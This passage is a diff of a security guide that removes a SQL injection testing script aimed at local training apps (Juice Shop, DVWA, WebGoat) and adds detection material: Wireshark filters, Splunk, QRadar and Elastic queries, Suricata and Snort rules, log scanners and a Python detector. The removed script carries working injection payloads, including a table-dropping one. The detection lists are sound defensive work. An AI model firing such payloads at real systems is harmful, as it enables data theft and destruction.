@@ -512,305 +512,711 @@ if __name__ == "__main__":
     main()
 ```
 
-## Shell Script Automation
+## Attack Detection and Monitoring
+
+### Wireshark Detection Signatures
+
+**Display Filter for SQL Injection Attempts:**
+
+```
+http contains "union select" or
+http contains "' or 1=1" or
+http contains "' or '1'='1" or
+http contains "admin'--" or
+http contains "' union select" or
+http contains "'; drop table" or
+http contains "' and sleep(" or
+http contains "' waitfor delay" or
+http contains "' and benchmark(" or
+http contains "extractvalue(" or
+http contains "updatexml(" or
+http.request.full_uri contains "%27%20or%20" or
+http.request.full_uri contains "%27%20union%20" or
+http.request.full_uri contains "%27%3b%20drop%20" or
+urlencoded-form.value contains "' or 1=1" or
+urlencoded-form.value contains "union select"
+```
+
+**Advanced SQL Injection Detection:**
+
+```
+# Time-based blind SQL injection
+http.time > 5 and (http contains "sleep(" or http contains "waitfor delay" or http contains "benchmark(")
+
+# Error-based SQL injection responses
+http.response.code == 500 and (http contains "mysql" or http contains "postgresql" or http contains "oracle" or http contains "sql server")
+
+# Union-based SQL injection
+http contains "union" and http contains "select" and http contains "from"
+
+# Boolean-based blind SQL injection patterns
+http.request.full_uri matches "(%27|').*(and|or).*(=|<|>|like).*(%27|')"
+```
+
+### Splunk Detection Queries
+
+**Basic SQL Injection Detection:**
+
+```spl
+index=web_logs
+| rex field=_raw "(?<uri_query>[^?\s]+\?[^\s]*)"
+| rex field=uri_query "(?i)(?<sqli_pattern>(union\s+select|'\s+or\s+.*=|admin'--|';\s*drop\s+table|'\s+and\s+sleep\(|'\s+waitfor\s+delay|extractvalue\(|updatexml\(|'\s+union\s+all\s+select|'\s+and\s+\d+=\d+|'\s+or\s+\d+=\d+))"
+| where isnotnull(sqli_pattern)
+| eval injection_type=case(
+    match(sqli_pattern, "(?i)union\s+select"), "Union-based",
+    match(sqli_pattern, "(?i)'\s+or\s+.*="), "Boolean-based",
+    match(sqli_pattern, "(?i)sleep\(|waitfor|benchmark\("), "Time-based",
+    match(sqli_pattern, "(?i)extractvalue|updatexml"), "Error-based",
+    1=1, "Generic"
+)
+| stats count by src_ip, dest_ip, uri_path, injection_type, sqli_pattern
+| where count > 1
+| sort -count
+```
+
+**Advanced SQL Injection Analytics:**
+
+```spl
+index=web_logs
+| eval sqli_score=0
+| eval sqli_score=if(match(_raw, "(?i)(union|select.*from)"), sqli_score+5, sqli_score)
+| eval sqli_score=if(match(_raw, "(?i)('\s+or\s+.*=|admin'--)"), sqli_score+4, sqli_score)
+| eval sqli_score=if(match(_raw, "(?i)(sleep\(|waitfor\s+delay|benchmark\()"), sqli_score+6, sqli_score)
+| eval sqli_score=if(match(_raw, "(?i)(extractvalue|updatexml|floor\(rand\(\))"), sqli_score+5, sqli_score)
+| eval sqli_score=if(match(_raw, "(?i)(';\s*drop|insert\s+into|delete\s+from)"), sqli_score+7, sqli_score)
+| eval sqli_score=if(match(_raw, "(?i)(information_schema|sys\.databases)"), sqli_score+3, sqli_score)
+| where sqli_score >= 4
+| eval risk_level=case(
+    sqli_score >= 10, "Critical",
+    sqli_score >= 7, "High",
+    sqli_score >= 4, "Medium",
+    1=1, "Low"
+)
+| stats count, max(sqli_score) as max_score by src_ip, risk_level, uri_path
+| sort -max_score
+```
+
+**SQL Injection Response Analysis:**
+
+```spl
+index=web_logs
+| rex field=_raw "(?<sqli_attempt>(union\s+select|'\s+or\s+.*=|admin'--|';\s*drop))"
+| where isnotnull(sqli_attempt)
+| eval response_analysis=case(
+    status=500, "Server Error (Potential Success)",
+    status=200 AND response_size>average_size*1.5, "Larger Response (Data Extraction)",
+    status=200 AND response_time>5, "Delayed Response (Time-based)",
+    status=403, "Blocked by WAF",
+    1=1, "Normal Response"
+)
+| stats count by src_ip, sqli_attempt, status, response_analysis
+| sort -count
+```
+
+### SIEM Integration
+
+**QRadar AQL Query:**
+
+```sql
+SELECT
+    sourceip,
+    destinationip,
+    "URL" as url,
+    payload,
+    eventcount,
+    CASE
+        WHEN payload ILIKE '%union%select%' THEN 'Union-based SQLi'
+        WHEN payload ILIKE '%''%or%' THEN 'Boolean-based SQLi'
+        WHEN payload ILIKE '%sleep(%' OR payload ILIKE '%waitfor%delay%' THEN 'Time-based SQLi'
+        WHEN payload ILIKE '%extractvalue%' OR payload ILIKE '%updatexml%' THEN 'Error-based SQLi'
+        ELSE 'Generic SQLi'
+    END as injection_type
+FROM events
+WHERE
+    devicetype = 12 AND
+    (payload ILIKE '%union%select%' OR
+     payload ILIKE '%''%or%1=1%' OR
+     payload ILIKE '%admin''---%' OR
+     payload ILIKE '%'';%drop%table%' OR
+     payload ILIKE '%sleep(%' OR
+     payload ILIKE '%waitfor%delay%')
+    AND eventtime > NOW() - INTERVAL '1 HOUR'
+ORDER BY eventtime DESC
+LIMIT 100
+```
+
+**Elastic Stack Detection Rule:**
+
+```json
+{
+  "query": {
+    "bool": {
+      "should": [
+        {
+          "regexp": {
+            "http.request.body.content": ".*('|%27).*(union|select|insert|delete|drop|update).*"
+          }
+        },
+        {
+          "regexp": {
+            "url.query": ".*('|%27).*(or|and).*(=|<|>).*"
+          }
+        },
+        {
+          "match_phrase": {
+            "http.request.body.content": "admin'--"
+          }
+        },
+        {
+          "regexp": {
+            "url.full": ".*(sleep\\(|waitfor.*delay|benchmark\\().*"
+          }
+        }
+      ],
+      "minimum_should_match": 1,
+      "filter": [
+        {
+          "range": {
+            "@timestamp": {
+              "gte": "now-1h"
+            }
+          }
+        }
+      ]
+    }
+  }
+}
+```
+
+### Network Security Monitoring
+
+**Suricata Rules:**
 
 ```bash
-#!/bin/zsh
-# SQL Injection Testing Automation Script
-# Supports OWASP Juice Shop, DVWA, XVWA, and WebGoat
+# Basic SQL injection detection
+alert http any any -> any any (msg:"SQL Injection - Union Select"; content:"union"; nocase; content:"select"; nocase; distance:0; within:20; sid:1001; rev:1;)
 
-set -e
+alert http any any -> any any (msg:"SQL Injection - Boolean OR attack"; content:"' or "; nocase; content:"="; distance:0; within:10; sid:1002; rev:1;)
 
-# Color codes for output
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-NC='\033[0m' # No Color
+alert http any any -> any any (msg:"SQL Injection - Admin comment bypass"; content:"admin'--"; nocase; sid:1003; rev:1;)
 
-# Configuration
-JUICE_SHOP_URL="http://localhost:3000"
-DVWA_URL="http://localhost/dvwa"
-WEBGOAT_URL="http://localhost:8080/WebGoat"
-XVWA_URL="http://localhost/xvwa"
+alert http any any -> any any (msg:"SQL Injection - Time-based blind"; content:"sleep("; nocase; sid:1004; rev:1;)
 
-# Results directory
-RESULTS_DIR="sql_injection_results_$(date +%Y%m%d_%H%M%S)"
-mkdir -p "$RESULTS_DIR"
+alert http any any -> any any (msg:"SQL Injection - Time-based MSSQL"; content:"waitfor delay"; nocase; sid:1005; rev:1;)
 
-echo -e "${BLUE}Starting SQL Injection Testing Suite${NC}"
-echo "Results will be saved to: $RESULTS_DIR"
+alert http any any -> any any (msg:"SQL Injection - Error-based MySQL"; content:"extractvalue("; nocase; sid:1006; rev:1;)
 
-# Function to test basic SQL injection
-test_basic_sql_injection() {
-    local url=$1
-    local parameter=$2
-    local test_value=$3
+# Advanced SQL injection patterns
+alert http any any -> any any (msg:"SQL Injection - Information Schema Access"; content:"information_schema"; nocase; sid:1007; rev:1;)
 
-    echo -e "${YELLOW}Testing basic SQL injection on $url${NC}"
+alert http any any -> any any (msg:"SQL Injection - System Database Access"; content:"sys.databases"; nocase; sid:1008; rev:1;)
 
-    # Common SQL injection payloads
-    local payloads=(
-        "' OR '1'='1"
-        "' OR '1'='1'--"
-        "' OR '1'='1'/*"
-        "admin'--"
-        "' UNION SELECT NULL--"
-        "'; DROP TABLE users--"
-    )
-
-    for payload in "${payloads[@]}"; do
-        echo "Testing payload: $payload"
-
-        if [[ "$parameter" == "json" ]]; then
-            # JSON POST request
-            response=$(curl -s -w "%{http_code}" -X POST "$url" \
-                -H "Content-Type: application/json" \
-                -d "{\"email\":\"admin$payload\",\"password\":\"test\"}" \
-                -o "$RESULTS_DIR/response_$(echo $payload | tr ' /' '_').html")
-        else
-            # GET request with parameters
-            encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed "s/'/%27/g")
-            response=$(curl -s -w "%{http_code}" \
-                "$url?$parameter=$test_value$encoded_payload" \
-                -o "$RESULTS_DIR/response_$(echo $payload | tr ' /' '_').html")
-        fi
-
-        # Check for SQL error indicators
-        if grep -qi -E "(sql|mysql|sqlite|postgresql|ora-|database)" \
-           "$RESULTS_DIR/response_$(echo $payload | tr ' /' '_').html" 2>/dev/null; then
-            echo -e "${RED}[VULNERABLE] SQL injection detected with payload: $payload${NC}"
-            echo "$url - $payload" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
-        elif [[ "$response" == "500" ]]; then
-            echo -e "${YELLOW}[POTENTIAL] Server error (500) with payload: $payload${NC}"
-            echo "$url - $payload (500 error)" >> "$RESULTS_DIR/potential_vulnerabilities.txt"
-        else
-            echo -e "${GREEN}[SAFE] No injection detected${NC}"
-        fi
-
-        sleep 0.5  # Rate limiting
-    done
-}
-
-# Function to test time-based blind SQL injection
-test_time_based_injection() {
-    local url=$1
-    local parameter=$2
-    local base_value=$3
-
-    echo -e "${YELLOW}Testing time-based blind SQL injection${NC}"
-
-    # Time-based payloads
-    local time_payloads=(
-        "'; WAITFOR DELAY '00:00:05'--"
-        "' AND SLEEP(5)--"
-        "' AND pg_sleep(5)--"
-        "' OR (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) AS x) > 1 AND SLEEP(5)--"
-    )
-
-    for payload in "${time_payloads[@]}"; do
-        echo "Testing time-based payload: $payload"
-
-        start_time=$(date +%s)
-
-        if [[ "$parameter" == "json" ]]; then
-            curl -s -m 10 -X POST "$url" \
-                -H "Content-Type: application/json" \
-                -d "{\"email\":\"admin$payload\",\"password\":\"test\"}" \
-                > /dev/null 2>&1
-        else
-            encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed "s/'/%27/g")
-            curl -s -m 10 "$url?$parameter=$base_value$encoded_payload" \
-                > /dev/null 2>&1
-        fi
-
-        end_time=$(date +%s)
-        duration=$((end_time - start_time))
-
-        if [[ $duration -ge 4 ]]; then
-            echo -e "${RED}[VULNERABLE] Time-based SQL injection detected! Response time: ${duration}s${NC}"
-            echo "$url - Time-based injection: $payload" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
-        else
-            echo -e "${GREEN}[SAFE] Normal response time: ${duration}s${NC}"
-        fi
-
-        sleep 1
-    done
-}
-
-# Function to run SQLMap automation
-run_sqlmap_tests() {
-    echo -e "${YELLOW}Running SQLMap automated tests${NC}"
-
-    # OWASP Juice Shop SQLMap tests
-    echo "Testing OWASP Juice Shop with SQLMap..."
-    sqlmap -u "$JUICE_SHOP_URL/rest/user/login" \
-        --data='{"email":"test","password":"test"}' \
-        --headers="Content-Type: application/json" \
-        --batch --level=3 --risk=3 --technique=B \
-        --output-dir="$RESULTS_DIR/sqlmap_juice_shop" 2>/dev/null || true
-
-    sqlmap -u "$JUICE_SHOP_URL/rest/products/search?q=test" \
-        --batch --level=3 --risk=3 \
-        --output-dir="$RESULTS_DIR/sqlmap_juice_shop_search" 2>/dev/null || true
-
-    # DVWA SQLMap tests (if available)
-    if curl -s "$DVWA_URL" > /dev/null 2>&1; then
-        echo "Testing DVWA with SQLMap..."
-        sqlmap -u "$DVWA_URL/vulnerabilities/sqli/?id=1&Submit=Submit" \
-            --cookie="security=low" \
-            --batch --level=2 --risk=2 \
-            --output-dir="$RESULTS_DIR/sqlmap_dvwa" 2>/dev/null || true
-    fi
-
-    # WebGoat SQLMap tests (if available)
-    if curl -s "$WEBGOAT_URL" > /dev/null 2>&1; then
-        echo "Testing WebGoat with SQLMap..."
-        sqlmap -u "$WEBGOAT_URL/SqlInjection/attack5a" \
-            --data="account=Smith&operator=and&injection=test" \
-            --batch --level=2 --risk=2 \
-            --output-dir="$RESULTS_DIR/sqlmap_webgoat" 2>/dev/null || true
-    fi
-}
-
-# Function to test boolean-based blind SQL injection
-test_boolean_blind_injection() {
-    local url=$1
-    local parameter=$2
-    local base_value=$3
-
-    echo -e "${YELLOW}Testing boolean-based blind SQL injection${NC}"
-
-    # Get baseline response
-    baseline_length=$(curl -s "$url?$parameter=$base_value" | wc -c)
-
-    # Test true condition
-    true_payload="$base_value' AND '1'='1"
-    encoded_true=$(echo "$true_payload" | sed 's/ /%20/g' | sed "s/'/%27/g")
-    true_length=$(curl -s "$url?$parameter=$encoded_true" | wc -c)
-
-    # Test false condition
-    false_payload="$base_value' AND '1'='2"
-    encoded_false=$(echo "$false_payload" | sed 's/ /%20/g' | sed "s/'/%27/g")
-    false_length=$(curl -s "$url?$parameter=$encoded_false" | wc -c)
-
-    echo "Baseline length: $baseline_length"
-    echo "True condition length: $true_length"
-    echo "False condition length: $false_length"
-
-    if [[ $true_length -eq $baseline_length && $false_length -ne $baseline_length ]]; then
-        echo -e "${RED}[VULNERABLE] Boolean-based blind SQL injection detected!${NC}"
-        echo "$url - Boolean-based blind injection" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
-    elif [[ $true_length -ne $false_length ]]; then
-        echo -e "${YELLOW}[POTENTIAL] Response length differences detected${NC}"
-        echo "$url - Potential boolean-based injection" >> "$RESULTS_DIR/potential_vulnerabilities.txt"
-    else
-        echo -e "${GREEN}[SAFE] No boolean-based injection detected${NC}"
-    fi
-}
-
-# Main testing function
-main() {
-    echo -e "${BLUE}SQL Injection Testing Suite Started${NC}"
-    echo "Timestamp: $(date)"
-    echo "Results directory: $RESULTS_DIR"
-
-    # Test OWASP Juice Shop
-    if curl -s "$JUICE_SHOP_URL" > /dev/null 2>&1; then
-        echo -e "\n${BLUE}Testing OWASP Juice Shop${NC}"
-        test_basic_sql_injection "$JUICE_SHOP_URL/rest/user/login" "json" ""
-        test_basic_sql_injection "$JUICE_SHOP_URL/rest/products/search" "q" "apple"
-        test_time_based_injection "$JUICE_SHOP_URL/rest/products/search" "q" "apple"
-        test_boolean_blind_injection "$JUICE_SHOP_URL/rest/products/search" "q" "apple"
-    else
-        echo -e "${YELLOW}OWASP Juice Shop not accessible at $JUICE_SHOP_URL${NC}"
-    fi
-
-    # Test DVWA
-    if curl -s "$DVWA_URL" > /dev/null 2>&1; then
-        echo -e "\n${BLUE}Testing DVWA${NC}"
-        test_basic_sql_injection "$DVWA_URL/vulnerabilities/sqli/" "id" "1"
-        test_time_based_injection "$DVWA_URL/vulnerabilities/sqli/" "id" "1"
-        test_boolean_blind_injection "$DVWA_URL/vulnerabilities/sqli/" "id" "1"
-    else
-        echo -e "${YELLOW}DVWA not accessible at $DVWA_URL${NC}"
-    fi
-
-    # Test WebGoat
-    if curl -s "$WEBGOAT_URL" > /dev/null 2>&1; then
-        echo -e "\n${BLUE}Testing WebGoat${NC}"
-        test_basic_sql_injection "$WEBGOAT_URL/SqlInjection/attack5a" "account" "Smith"
-    else
-        echo -e "${YELLOW}WebGoat not accessible at $WEBGOAT_URL${NC}"
-    fi
-
-    # Run SQLMap automation
-    if command -v sqlmap >/dev/null 2>&1; then
-        echo -e "\n${BLUE}Running SQLMap Automation${NC}"
-        run_sqlmap_tests
-    else
-        echo -e "${YELLOW}SQLMap not installed, skipping automated tests${NC}"
-    fi
-
-    # Generate summary report
-    echo -e "\n${BLUE}Generating Summary Report${NC}"
-
-    if [[ -f "$RESULTS_DIR/vulnerable_endpoints.txt" ]]; then
-        vulnerable_count=$(wc -l < "$RESULTS_DIR/vulnerable_endpoints.txt")
-        echo -e "${RED}Vulnerable endpoints found: $vulnerable_count${NC}"
-        echo "Vulnerable endpoints:"
-        cat "$RESULTS_DIR/vulnerable_endpoints.txt"
-    else
-        echo -e "${GREEN}No confirmed vulnerabilities found${NC}"
-    fi
-
-    if [[ -f "$RESULTS_DIR/potential_vulnerabilities.txt" ]]; then
-        potential_count=$(wc -l < "$RESULTS_DIR/potential_vulnerabilities.txt")
-        echo -e "${YELLOW}Potential vulnerabilities: $potential_count${NC}"
-        echo "Potential vulnerabilities:"
-        cat "$RESULTS_DIR/potential_vulnerabilities.txt"
-    fi
-
-    echo -e "\n${BLUE}Testing complete. Results saved to: $RESULTS_DIR${NC}"
-    echo "Key files:"
-    echo "- vulnerable_endpoints.txt: Confirmed SQL injection vulnerabilities"
-    echo "- potential_vulnerabilities.txt: Potential issues requiring manual review"
-    echo "- sqlmap_*: SQLMap automated test results"
-    echo "- response_*.html: HTTP response captures"
-}
-
-# Check dependencies
-check_dependencies() {
-    echo "Checking dependencies..."
-
-    if ! command -v curl >/dev/null 2>&1; then
-        echo -e "${RED}Error: curl is required but not installed${NC}"
-        exit 1
-    fi
-
-    if ! command -v sqlmap >/dev/null 2>&1; then
-        echo -e "${YELLOW}Warning: sqlmap not found. Install with: brew install sqlmap${NC}"
-    fi
-
-    echo -e "${GREEN}Dependencies check complete${NC}"
-}
-
-# Cleanup function
-cleanup() {
-    echo -e "\n${YELLOW}Cleaning up temporary files...${NC}"
-    # Remove any temporary files if needed
-    echo -e "${GREEN}Cleanup complete${NC}"
-}
-
-# Set trap for cleanup
-trap cleanup EXIT
-
-# Run dependency check and main function
-check_dependencies
-main
-
-echo -e "\n${GREEN}SQL Injection testing suite completed successfully!${NC}"
+alert http any any -> any any (msg:"SQL Injection - Drop Table Attempt"; content:"drop table"; nocase; sid:1009; rev:1;)
 ```
+
+**Snort Rules:**
+
+```bash
+alert tcp any any -> any [80,443,8080,8443] (msg:"SQL Injection Union Select"; flow:established,to_server; content:"union"; nocase; content:"select"; nocase; distance:1; within:50; classtype:web-application-attack; sid:1000001; rev:1;)
+
+alert tcp any any -> any [80,443,8080,8443] (msg:"SQL Injection OR 1=1"; flow:established,to_server; content:"or 1=1"; nocase; classtype:web-application-attack; sid:1000002; rev:1;)
+
+alert tcp any any -> any [80,443,8080,8443] (msg:"SQL Injection Comment Bypass"; flow:established,to_server; content:"'--"; classtype:web-application-attack; sid:1000003; rev:1;)
+```
+
+### Log Analysis Scripts
+
+**Apache/Nginx Log Analysis (Bash):**
+
+```bash
+#!/bin/bash
+
+LOG_FILE="/var/log/apache2/access.log"
+ALERT_THRESHOLD=5
+OUTPUT_FILE="/tmp/sqli_detection_$(date +%Y%m%d_%H%M%S).txt"
+
+echo "SQL Injection Detection Analysis - $(date)" > "$OUTPUT_FILE"
+echo "=============================================" >> "$OUTPUT_FILE"
+
+# Detect common SQL injection patterns
+echo -e "\n[+] Union-based SQL Injection Attempts:" >> "$OUTPUT_FILE"
+grep -i "union.*select" "$LOG_FILE" | tail -20 >> "$OUTPUT_FILE"
+
+echo -e "\n[+] Boolean-based SQL Injection Attempts:" >> "$OUTPUT_FILE"
+grep -E "('|\%27).*(or|and).*(=|\%3d)" "$LOG_FILE" | tail -20 >> "$OUTPUT_FILE"
+
+echo -e "\n[+] Time-based SQL Injection Attempts:" >> "$OUTPUT_FILE"
+grep -iE "(sleep\(|waitfor.*delay|benchmark\()" "$LOG_FILE" | tail -20 >> "$OUTPUT_FILE"
+
+echo -e "\n[+] Error-based SQL Injection Attempts:" >> "$OUTPUT_FILE"
+grep -iE "(extractvalue|updatexml|floor.*rand)" "$LOG_FILE" | tail -20 >> "$OUTPUT_FILE"
+
+# IP frequency analysis
+echo -e "\n[+] Top Source IPs for SQL Injection:" >> "$OUTPUT_FILE"
+grep -iE "(union.*select|'.*or.*=|sleep\(|extractvalue)" "$LOG_FILE" | \
+awk '{print $1}' | sort | uniq -c | sort -nr | head -10 >> "$OUTPUT_FILE"
+
+# Alert on suspicious activity
+SQLI_COUNT=$(grep -icE "(union.*select|'.*or.*=|sleep\()" "$LOG_FILE")
+if [ "$SQLI_COUNT" -gt "$ALERT_THRESHOLD" ]; then
+    echo -e "\n[!] ALERT: $SQLI_COUNT SQL injection attempts detected!" >> "$OUTPUT_FILE"
+    echo "Threshold: $ALERT_THRESHOLD" >> "$OUTPUT_FILE"
+fi
+
+echo "Analysis complete. Results saved to: $OUTPUT_FILE"
+```
+
+**IIS Log Analysis (PowerShell):**
+
+```powershell
+param(
+    [string]$LogPath = "C:\inetpub\logs\LogFiles\W3SVC1\",
+    [int]$Hours = 24
+)
+
+$StartTime = (Get-Date).AddHours(-$Hours)
+$OutputFile = "SQLi_Detection_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+
+"SQL Injection Detection Analysis - $(Get-Date)" | Out-File $OutputFile
+"=============================================" | Out-File $OutputFile -Append
+
+# Get recent log files
+$LogFiles = Get-ChildItem $LogPath -Filter "*.log" | Where-Object {$_.LastWriteTime -gt $StartTime}
+
+foreach ($LogFile in $LogFiles) {
+    $Content = Get-Content $LogFile.FullName
+
+    # Union-based attacks
+    $UnionAttacks = $Content | Select-String -Pattern "union.*select" -AllMatches
+    if ($UnionAttacks) {
+        "`n[+] Union-based SQL Injection in $($LogFile.Name):" | Out-File $OutputFile -Append
+        $UnionAttacks | Select-Object -First 10 | Out-File $OutputFile -Append
+    }
+
+    # Boolean-based attacks
+    $BooleanAttacks = $Content | Select-String -Pattern "('|%27).*(or|and).*(=|%3d)" -AllMatches
+    if ($BooleanAttacks) {
+        "`n[+] Boolean-based SQL Injection in $($LogFile.Name):" | Out-File $OutputFile -Append
+        $BooleanAttacks | Select-Object -First 10 | Out-File $OutputFile -Append
+    }
+
+    # Time-based attacks
+    $TimeAttacks = $Content | Select-String -Pattern "(sleep\(|waitfor.*delay)" -AllMatches
+    if ($TimeAttacks) {
+        "`n[+] Time-based SQL Injection in $($LogFile.Name):" | Out-File $OutputFile -Append
+        $TimeAttacks | Select-Object -First 10 | Out-File $OutputFile -Append
+    }
+}
+
+Write-Host "Analysis complete. Results saved to: $OutputFile"
+```
+
+### Python Behavioral Detection Script
+
+```python
+#!/usr/bin/env python3
+"""
+SQL Injection Attack Detection and Analysis System
+Real-time monitoring and behavioral analysis
+"""
+
+import re
+import json
+import time
+import sqlite3
+import hashlib
+from datetime import datetime, timedelta
+from collections import defaultdict, Counter
+from urllib.parse import unquote
+import logging
+
+class SQLInjectionDetector:
+    def __init__(self, db_path="sqli_detection.db"):
+        self.db_path = db_path
+        self.setup_database()
+        self.setup_logging()
+
+        # SQL injection patterns
+        self.patterns = {
+            'union_based': [
+                r'union\s+select',
+                r'union\s+all\s+select',
+                r'\'\s+union\s+select'
+            ],
+            'boolean_based': [
+                r"'\s+or\s+\d+=\d+",
+                r"'\s+or\s+'[^']*'\s*=\s*'[^']*'",
+                r"'\s+and\s+\d+=\d+",
+                r"admin'--"
+            ],
+            'time_based': [
+                r'sleep\s*\(\s*\d+\s*\)',
+                r'waitfor\s+delay\s+',
+                r'benchmark\s*\(\s*\d+',
+                r'pg_sleep\s*\(\s*\d+\s*\)'
+            ],
+            'error_based': [
+                r'extractvalue\s*\(',
+                r'updatexml\s*\(',
+                r'floor\s*\(\s*rand\s*\(\s*\)\s*\*',
+                r'exp\s*\(\s*~\s*\('
+            ],
+            'stacked_queries': [
+                r';\s*drop\s+table',
+                r';\s*delete\s+from',
+                r';\s*insert\s+into',
+                r';\s*update\s+.*\s+set'
+            ]
+        }
+
+        # Thresholds for detection
+        self.thresholds = {
+            'attempts_per_ip': 10,
+            'attempts_per_minute': 20,
+            'unique_patterns_per_ip': 5,
+            'time_window': 300  # 5 minutes
+        }
+
+        # Tracking dictionaries
+        self.ip_attempts = defaultdict(list)
+        self.pattern_matches = defaultdict(list)
+
+    def setup_database(self):
+        """Initialize SQLite database for tracking"""
+        conn = sqlite3.connect(self.db_path)
+        cursor = conn.cursor()
+
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS sqli_attempts (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                timestamp TEXT,
+                source_ip TEXT,
+                target_url TEXT,
+                payload TEXT,
+                injection_type TEXT,
+                risk_score INTEGER,
+                blocked BOOLEAN
+            )
+        ''')
+
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS ip_reputation (
+                ip_address TEXT PRIMARY KEY,
+                reputation_score INTEGER,
+                last_updated TEXT,
+                total_attempts INTEGER,
+                blocked_attempts INTEGER
+            )
+        ''')
+
+        conn.commit()
+        conn.close()
+
+    def setup_logging(self):
+        """Configure logging"""
+        logging.basicConfig(
+            level=logging.INFO,
+            format='%(asctime)s - %(levelname)s - %(message)s',
+            handlers=[
+                logging.FileHandler('sqli_detector.log'),
+                logging.StreamHandler()
+            ]
+        )
+        self.logger = logging.getLogger(__name__)
+
+    def analyze_request(self, request_data):
+        """
+        Analyze HTTP request for SQL injection patterns
+
+        Args:
+            request_data (dict): Contains 'ip', 'url', 'params', 'body', 'headers'
+
+        Returns:
+            dict: Analysis results
+        """
+        source_ip = request_data.get('ip')
+        url = request_data.get('url', '')
+        params = request_data.get('params', {})
+        body = request_data.get('body', '')
+
+        # Combine all input data
+        combined_input = f"{url} {json.dumps(params)} {body}"
+        decoded_input = unquote(combined_input).lower()
+
+        detection_results = {
+            'timestamp': datetime.now().isoformat(),
+            'source_ip': source_ip,
+            'target_url': url,
+            'detected_patterns': [],
+            'injection_types': [],
+            'risk_score': 0,
+            'should_block': False
+        }
+
+        # Pattern matching
+        for injection_type, patterns in self.patterns.items():
+            for pattern in patterns:
+                matches = re.finditer(pattern, decoded_input, re.IGNORECASE)
+                for match in matches:
+                    detection_results['detected_patterns'].append({
+                        'type': injection_type,
+                        'pattern': pattern,
+                        'match': match.group(),
+                        'position': match.span()
+                    })
+
+                    if injection_type not in detection_results['injection_types']:
+                        detection_results['injection_types'].append(injection_type)
+
+        # Calculate risk score
+        detection_results['risk_score'] = self.calculate_risk_score(detection_results)
+
+        # Behavioral analysis
+        if detection_results['detected_patterns']:
+            self.update_behavioral_tracking(source_ip, detection_results)
+            detection_results['should_block'] = self.should_block_ip(source_ip)
+
+            # Log to database
+            self.log_attempt(detection_results, combined_input)
+
+        return detection_results
+
+    def calculate_risk_score(self, detection_results):
+        """Calculate risk score based on detected patterns"""
+        score = 0
+        type_scores = {
+            'union_based': 8,
+            'boolean_based': 6,
+            'time_based': 9,
+            'error_based': 7,
+            'stacked_queries': 10
+        }
+
+        for pattern_data in detection_results['detected_patterns']:
+            injection_type = pattern_data['type']
+            score += type_scores.get(injection_type, 5)
+
+        # Bonus for multiple types
+        if len(detection_results['injection_types']) > 1:
+            score += len(detection_results['injection_types']) * 2
+
+        return min(score, 100)  # Cap at 100
+
+    def update_behavioral_tracking(self, source_ip, detection_results):
+        """Update behavioral tracking for IP address"""
+        current_time = datetime.now()
+
+        # Clean old entries
+        cutoff_time = current_time - timedelta(seconds=self.thresholds['time_window'])
+        self.ip_attempts[source_ip] = [
+            attempt for attempt in self.ip_attempts[source_ip]
+            if attempt['timestamp'] > cutoff_time
+        ]
+
+        # Add new attempt
+        self.ip_attempts[source_ip].append({
+            'timestamp': current_time,
+            'risk_score': detection_results['risk_score'],
+            'injection_types': detection_results['injection_types']
+        })
+
+    def should_block_ip(self, source_ip):
+        """Determine if IP should be blocked based on behavioral analysis"""
+        attempts = self.ip_attempts.get(source_ip, [])
+
+        if len(attempts) >= self.thresholds['attempts_per_ip']:
+            return True
+
+        # Check for rapid-fire attempts
+        if len(attempts) >= 5:
+            recent_attempts = [a for a in attempts if
+                             a['timestamp'] > datetime.now() - timedelta(minutes=1)]
+            if len(recent_attempts) >= self.thresholds['attempts_per_minute']:
+                return True
+
+        # Check for diverse attack patterns
+        all_types = set()
+        for attempt in attempts:
+            all_types.update(attempt['injection_types'])
+        if len(all_types) >= self.thresholds['unique_patterns_per_ip']:
+            return True
+
+        return False
+
+    def log_attempt(self, detection_results, payload):
+        """Log attempt to database"""
+        conn = sqlite3.connect(self.db_path)
+        cursor = conn.cursor()
+
+        cursor.execute('''
+            INSERT INTO sqli_attempts
+            (timestamp, source_ip, target_url, payload, injection_type, risk_score, blocked)
+            VALUES (?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            detection_results['timestamp'],
+            detection_results['source_ip'],
+            detection_results['target_url'],
+            payload[:500],  # Truncate long payloads
+            ','.join(detection_results['injection_types']),
+            detection_results['risk_score'],
+            detection_results['should_block']
+        ))
+
+        # Update IP reputation
+        cursor.execute('''
+            INSERT OR REPLACE INTO ip_reputation
+            (ip_address, reputation_score, last_updated, total_attempts, blocked_attempts)
+            VALUES (?, ?, ?,
+                    COALESCE((SELECT total_attempts FROM ip_reputation WHERE ip_address = ?), 0) + 1,
+                    COALESCE((SELECT blocked_attempts FROM ip_reputation WHERE ip_address = ?), 0) + ?)
+        ''', (
+            detection_results['source_ip'],
+            max(0, 100 - detection_results['risk_score']),
+            detection_results['timestamp'],
+            detection_results['source_ip'],
+            detection_results['source_ip'],
+            1 if detection_results['should_block'] else 0
+        ))
+
+        conn.commit()
+        conn.close()
+
+    def generate_report(self, hours=24):
+        """Generate detection report"""
+        conn = sqlite3.connect(self.db_path)
+        cursor = conn.cursor()
+
+        cutoff_time = (datetime.now() - timedelta(hours=hours)).isoformat()
+
+        # Get attack statistics
+        cursor.execute('''
+            SELECT injection_type, COUNT(*) as count, AVG(risk_score) as avg_risk
+            FROM sqli_attempts
+            WHERE timestamp > ?
+            GROUP BY injection_type
+            ORDER BY count DESC
+        ''', (cutoff_time,))
+
+        attack_stats = cursor.fetchall()
+
+        # Get top attacking IPs
+        cursor.execute('''
+            SELECT source_ip, COUNT(*) as attempts, MAX(risk_score) as max_risk
+            FROM sqli_attempts
+            WHERE timestamp > ?
+            GROUP BY source_ip
+            ORDER BY attempts DESC
+            LIMIT 10
+        ''', (cutoff_time,))
+
+        top_ips = cursor.fetchall()
+
+        # Get blocked attempts
+        cursor.execute('''
+            SELECT COUNT(*) as blocked_count
+            FROM sqli_attempts
